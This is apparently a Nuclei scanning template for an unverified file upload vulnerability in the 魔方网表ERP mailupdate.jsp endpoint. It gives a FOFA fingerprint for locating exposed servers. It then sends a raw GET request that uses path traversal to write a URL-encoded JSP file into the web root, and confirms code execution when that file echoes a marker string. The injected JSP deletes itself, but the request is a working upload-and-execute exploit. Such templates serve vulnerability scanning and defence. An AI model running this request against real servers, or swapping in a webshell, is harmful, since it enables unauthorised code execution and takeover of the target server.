id: mofangwangbiaoERP-mailupdate_jsp-File-upload
info:
  name: 魔方网表ERP mailupdate.jsp 未验证文件上传漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: icon_hash="694014318"
      魔方网表ERP系统mailupdate.jsp接口未实施有效的文件上传验证机制，攻击者可利用该接口绕过安全限制上传恶意文件。该缺陷允许远程攻击者通过构造特定请求实现服务器端代码执行、后门植入及系统权限提升，最终可能导致目标Web服务器的完全控制。
  reference:
  - https://mp.weixin.qq.com/s/HLz-zVZxi3k-T6jToZyxBw
  tags: 魔方网表ERP

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../{{username}}.jsp&messagecontent=%3C%25+out.println%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

- raw:
  - |
    GET /magicflu/{{username}}.jsp HTTP/1.1
    Host: {{Hostname}}

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'pboyjnnrfipmplsukdeczudsefxmywe'
  - type: status
    status:
    - 200
